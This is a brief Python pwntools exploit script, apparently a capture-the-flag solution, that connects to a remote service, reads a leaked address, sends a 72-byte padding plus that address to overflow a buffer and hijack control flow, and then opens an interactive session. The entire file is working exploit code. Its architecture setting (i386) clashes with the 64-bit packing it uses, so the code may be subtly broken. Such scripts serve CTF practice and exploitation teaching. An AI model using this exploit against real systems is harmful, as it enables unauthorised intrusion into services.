from pwn import *

context(arch="i386", os="linux", log_level="debug")

p = remote("111.198.29.45", 48603)
p.recvuntil("WOW:")
addr = int(p.recv(8), 16)

p.sendline("A"*72 + p64(addr).decode())
p.interactive()